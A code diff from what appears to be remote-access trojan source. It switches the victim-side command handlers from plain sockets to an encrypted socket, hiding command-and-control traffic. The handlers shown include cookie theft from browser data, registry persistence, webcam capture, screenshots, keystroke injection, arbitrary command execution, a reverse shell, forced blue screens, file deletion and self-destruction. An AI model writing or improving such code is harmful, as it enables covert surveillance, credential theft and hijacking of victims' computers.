@@ -18,9 +18,8 @@ from shared.extras.double_command import (
     send_bytes,
     send_item,
 )
+from shared.extras.encrypted_socket import EncryptedSocket
 from server_extras.client import Client
-
-import socket
 
 
 @add_double_command(
@@ -31,7 +30,7 @@ import socket
 )
 class KillProcess(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import signal
         import os
 
@@ -96,7 +95,7 @@ class KillProcess(DoubleCommand):
 )
 class LaunchExecutableFile(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import subprocess
         import tempfile
         import random
@@ -167,7 +166,7 @@ class LaunchExecutableFile(DoubleCommand):
 )
 class InvokeBSOD(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import shared.command_consts
         import subprocess
 
@@ -211,7 +210,7 @@ class InvokeBSOD(DoubleCommand):
 )
 class ShowImage(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import threading
         import PIL.Image
         import io
@@ -262,7 +261,7 @@ class ShowImage(DoubleCommand):
 )
 class TakeScreenshot(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import PIL.ImageGrab
         import io
 
@@ -321,7 +320,7 @@ class TakeScreenshot(DoubleCommand):
 )
 class TypeWrite(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import pyautogui
         import threading
 
@@ -366,7 +365,7 @@ class TypeWrite(DoubleCommand):
 )
 class RunCommand(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import subprocess
 
         command = recieve_string(sock, False)
@@ -425,7 +424,7 @@ class RunCommand(DoubleCommand):
 )
 class CaptureWebcamImage(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import numpy
         import cv2
 
@@ -537,7 +536,7 @@ class CaptureWebcamImage(DoubleCommand):
 )
 class AddPersistence(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         from shared.command_consts import CLIENT_STARTUP_SCRIPT, ADD_SELF_TO_PATH
         import subprocess
         import winreg
@@ -658,7 +657,7 @@ class AddPersistence(DoubleCommand):
 )
 class Reboot(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import threading
         import rebooter
         import time
@@ -703,7 +702,7 @@ class Reboot(DoubleCommand):
 )
 class Shutdown(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import threading
         import rebooter
         import time
@@ -748,7 +747,7 @@ class Shutdown(DoubleCommand):
 )
 class SelfDestruct(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         from shared.command_consts import RETRY_DELETE_FOLDER
         import subprocess
         import random
@@ -805,7 +804,7 @@ class SelfDestruct(DoubleCommand):
 )
 class CookieStealer(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os
 
         LOCAL = os.getenv("LOCALAPPDATA")
@@ -912,7 +911,7 @@ class UploadItem(DoubleCommand):
         return zio.read()
 
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import zipfile
         import io
 
@@ -1050,7 +1049,7 @@ class DownloadItem(DoubleCommand):
         return zio.read()
 
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os.path
 
         try:
@@ -1186,7 +1185,7 @@ class DownloadItem(DoubleCommand):
 )
 class OpenURL(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import webbrowser
 
         success_indicator = b"y"
@@ -1237,7 +1236,7 @@ class OpenURL(DoubleCommand):
 )
 class ListDirectory(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os
 
         try:
@@ -1318,7 +1317,7 @@ class ListDirectory(DoubleCommand):
 )
 class MakeDirectory(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os
 
         try:
@@ -1388,7 +1387,7 @@ class MakeDirectory(DoubleCommand):
 )
 class DeleteDirectory(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os.path
         import shutil
 
@@ -1457,7 +1456,7 @@ class DeleteDirectory(DoubleCommand):
 )
 class DeleteFile(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os
 
         try:
@@ -1529,7 +1528,7 @@ class DeleteFile(DoubleCommand):
 )
 class Touch(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os.path
 
         try:
@@ -1604,7 +1603,7 @@ class Touch(DoubleCommand):
 )
 class ListProcesses(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import psutil
 
         for proc in psutil.process_iter(["pid", "name"]):
@@ -1649,7 +1648,7 @@ class ListProcesses(DoubleCommand):
 )
 class ChangeCWD(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import os
 
         try:
@@ -1715,7 +1714,7 @@ class ChangeCWD(DoubleCommand):
 )
 class SetClipboard(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import pyperclip
 
         try:
@@ -1747,7 +1746,7 @@ class SetClipboard(DoubleCommand):
 )
 class GetClipboard(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import pyperclip
 
         try:
@@ -1776,7 +1775,7 @@ class GetClipboard(DoubleCommand):
 )
 class Popup(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import threading
 
         def message_box(title: str, message: str, level: str) -> None:
@@ -1876,7 +1875,7 @@ class Popup(DoubleCommand):
 )
 class GatherSystemInformation(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import platform
         import os
 
@@ -1916,7 +1915,7 @@ class GatherSystemInformation(DoubleCommand):
 )
 class Geolocate(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import urllib.request
 
         try:
@@ -1975,7 +1974,7 @@ class Shell(DoubleCommand):
         )
 
     @staticmethod
-    def __windows_client(shell_sock: socket.socket) -> None:
+    def __windows_client(shell_sock: EncryptedSocket) -> None:
         # shell structure from revshells.com
         import subprocess
         import threading
@@ -2027,7 +2026,7 @@ class Shell(DoubleCommand):
         running["running"] = False
 
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import socket
         import sys
 
@@ -2145,7 +2144,7 @@ class PlaySound(DoubleCommand):
         pyglet.app.run()
 
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def client_side(sock: EncryptedSocket) -> None:
         import multiprocessing
         import os
 
